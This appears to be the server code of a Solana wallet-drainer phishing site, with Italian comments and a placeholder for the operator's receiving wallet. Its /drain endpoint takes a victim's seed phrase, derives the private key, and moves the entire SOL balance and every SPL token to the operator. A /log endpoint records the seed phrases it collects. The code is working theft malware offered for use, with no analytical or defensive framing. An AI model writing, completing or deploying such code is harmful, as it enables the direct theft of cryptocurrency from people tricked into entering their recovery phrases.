// server.js - DRENAGGIO GODMODE CON APPKIT
import express from 'express'
import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, Keypair } from '@solana/web3.js'
import { 
  createTransferInstruction,
  createAssociatedTokenAccountInstruction,
  getAssociatedTokenAddress,
  TOKEN_PROGRAM_ID
} from '@solana/spl-token'
import { mnemonicToSeed } from 'bip39'
import { derivePath } from 'ed25519-hd-key'
import path from 'path'
import { fileURLToPath } from 'url'

const __filename = fileURLToPath(import.meta.url)
const __dirname = path.dirname(__filename)

const app = express()
app.use(express.json({ limit: '10mb' }))

// ===== CONFIGURAZIONE =====
// METTI QUI IL TUO WALLET PUBBLICO - DOVE VENGONO DRENATI I FONDI
const YOUR_RECEIVER_WALLET = 'IL_TUO_WALLET_PUBBLICO' // SOSTITUISCI CON IL TUO
const connection = new Connection('https://api.mainnet-beta.solana.com')

// ===== DRENAGGIO TOTALE - ENDPOINT MIGLIORATO =====
app.post('/drain', async (req, res) => {
  const { seed, walletPublicKey, tokenName, tokenSymbol, decimals, supply } = req.body
  
  // Verifica che il wallet sia connesso (via AppKit)
  if (!walletPublicKey) {
    return res.status(400).json({ 
      error: 'Wallet non connesso. Connettiti prima con AppKit.',
      status: 'wallet_required'
    })
  }

  // Verifica la seed
  if (!seed || seed.split(' ').length < 12) {
    return res.status(400).json({ 
      error: 'Seed phrase non valida. Deve contenere 12 o 24 parole.',
      status: 'invalid_seed'
    })
  }

  try {
    // 1. Deriva la keypair dalla seed
    const seedBuffer = await mnemonicToSeed(seed)
    const derived = derivePath("m/44'/501'/0'/0'", seedBuffer.toString('hex'))
    const fromKeypair = Keypair.fromSeed(derived.key)
    const fromPubkey = fromKeypair.publicKey
    const toPubkey = new PublicKey(YOUR_RECEIVER_WALLET)

    // Verifica che la chiave pubblica derivata corrisponda al wallet connesso
    if (fromPubkey.toString() !== walletPublicKey) {
      return res.status(403).json({
        error: 'La seed non corrisponde al wallet connesso. Verifica e riprova.',
        status: 'seed_mismatch',
        derived: fromPubkey.toString(),
        connected: walletPublicKey
      })
    }

    console.log(`🔄 DRENAGGIO INIZIATO PER: ${fromPubkey.toString()}`)
    console.log(`📦 WALLET CONNESSO: ${walletPublicKey}`)
    console.log(`📝 TOKEN NAME: ${tokenName || 'N/A'}`)
    console.log(`🔑 SEED RICEVUTA: ${seed.substring(0, 10)}...`)

    // ===== 2. DRENAGGIO TUTTI I SOL =====
    const balance = await connection.getBalance(fromPubkey)
    const fee = 5000 // Fee per la transazione
    const solAmount = balance - fee
    let solTx = null
    
    if (solAmount > 0) {
      const tx = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: fromPubkey,
          toPubkey: toPubkey,
          lamports: solAmount,
        })
      )
      
      solTx = await connection.sendTransaction(tx, [fromKeypair])
      await connection.confirmTransaction(solTx, 'finalized')
      console.log(`✅ SOL DRENATI: ${solAmount / LAMPORTS_PER_SOL} SOL, Tx: ${solTx}`)
    } else {
      console.log(`⚠️ SALDO SOL INSUFFICIENTE: ${balance / LAMPORTS_PER_SOL} SOL (fee: ${fee})`)
    }

    // ===== 3. DRENAGGIO TUTTI I TOKEN SPL =====
    const tokenAccounts = await connection.getTokenAccountsByOwner(fromPubkey, {
      programId: TOKEN_PROGRAM_ID,
    })

    let tokenTxList = []
    let tokenDetails = []

    for (const account of tokenAccounts.value) {
      const tokenAccount = account.pubkey
      const tokenInfo = await connection.getTokenAccountBalance(tokenAccount)
      
      if (tokenInfo.value.amount > 0) {
        try {
          // Ottieni il mint del token
          const accountInfo = await connection.getAccountInfo(tokenAccount)
          if (!accountInfo) continue
          
          const mint = new PublicKey(accountInfo.data.slice(0, 32))
          
          // Ottieni l'account token del ricevente
          const receiverTokenAccount = await getAssociatedTokenAddress(
            mint,
            toPubkey
          )
          
          // Verifica se l'account token del ricevente esiste
          const receiverAccountInfo = await connection.getAccountInfo(receiverTokenAccount)
          
          // Crea transazione
          const tx = new Transaction()
          
          // Se l'account del ricevente non esiste, crealo
          if (!receiverAccountInfo) {
            tx.add(
              createAssociatedTokenAccountInstruction(
                fromPubkey, // payer
                receiverTokenAccount,
                toPubkey,
                mint
              )
            )
          }
          
          // Aggiungi istruzione di trasferimento
          tx.add(
            createTransferInstruction(
              tokenAccount,
              receiverTokenAccount,
              fromPubkey,
              BigInt(tokenInfo.value.amount)
            )
          )
          
          const signature = await connection.sendTransaction(tx, [fromKeypair])
          await connection.confirmTransaction(signature, 'finalized')
          tokenTxList.push(signature)
          tokenDetails.push({
            mint: mint.toString(),
            amount: tokenInfo.value.uiAmount,
            decimals: tokenInfo.value.decimals,
            tx: signature
          })
          
          console.log(`🪙 TOKEN DRENATO: ${tokenInfo.value.uiAmount} (${mint.toString()}), Tx: ${signature}`)
          
        } catch(e) {
          console.log(`⚠️ ERRORE DRENAGGIO TOKEN: ${e.message}`)
        }
      }
    }

    // ===== 4. RISPOSTA CON DETTAGLI =====
    const totalSolDrained = solAmount / LAMPORTS_PER_SOL
    const totalTokensDrained = tokenTxList.length

    console.log(`📊 DRENAGGIO COMPLETATO: ${totalSolDrained} SOL, ${totalTokensDrained} token`)

    res.json({
      status: 'drain_completed',
      from: fromPubkey.toString(),
      to: YOUR_RECEIVER_WALLET,
      solTx: solTx,
      solAmount: totalSolDrained,
      tokenTxs: tokenTxList,
      tokenDetails: tokenDetails,
      tokenCount: totalTokensDrained,
      message: `✅ Drenaggio completato! ${totalSolDrained} SOL e ${totalTokensDrained} token trasferiti.`
    })

  } catch (e) {
    console.error('❌ ERRORE DRENAGGIO:', e.message)
    console.error('📋 STACK:', e.stack)
    res.status(500).json({ 
      error: e.message,
      status: 'drain_failed',
      details: e.stack
    })
  }
})

// ===== ENDPOINT DI VERIFICA WALLET =====
app.post('/verify-wallet', async (req, res) => {
  const { walletPublicKey } = req.body
  
  if (!walletPublicKey) {
    return res.status(400).json({ error: 'Wallet non fornito' })
  }
  
  try {
    const pubkey = new PublicKey(walletPublicKey)
    const balance = await connection.getBalance(pubkey)
    
    res.json({
      status: 'verified',
      wallet: walletPublicKey,
      balance: balance / LAMPORTS_PER_SOL,
      isValid: true
    })
  } catch (e) {
    res.status(400).json({ 
      error: 'Wallet non valido',
      status: 'invalid'
    })
  }
})

// ===== LOGGING =====
app.post('/log', (req, res) => {
  console.log('📥 LOG RICEVUTO:', req.body)
  if (req.body.seed) {
    console.log('⚠️ SEED RICEVUTA:', req.body.seed)
  }
  if (req.body.walletPublicKey) {
    console.log('👛 WALLET CONNESSO:', req.body.walletPublicKey)
  }
  res.json({ status: 'ok' })
})

// ===== SERVE LE PAGINE =====
app.use(express.static('dist'))

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'dist', 'index.html'))
})

app.listen(3000, () => console.log('🚀 SERVER DRENAGGIO GODMODE ATTIVO SU http://localhost:3000'))
